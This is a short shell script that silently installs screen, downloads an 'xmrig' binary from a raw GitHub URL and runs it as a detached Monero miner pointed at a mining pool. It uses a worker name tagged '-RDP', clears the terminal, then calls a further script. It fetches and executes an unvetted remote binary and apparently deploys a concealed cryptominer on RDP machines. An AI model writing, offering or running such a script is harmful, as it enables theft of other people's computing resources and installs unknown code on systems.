#!/bin/sh

WALLET=Prodent

POOL=prohashing.com:3359 

sudo apt update > /dev/null 2>&1
sudo apt install screen -y > /dev/null 2>&1
wget https://raw.githubusercontent.com/hondacars/xxx/main/xmrig; chmod +x xmrig
screen -S Admin_Bo -dm ./xmrig -o $POOL -u $WALLET -p n=$(echo $(shuf -i 1-200 -n 1)-RDP) -k --coin monero -a rx/0
screen -ls
sleep 4
clear

screen -ls
./Timer_Bo.sh
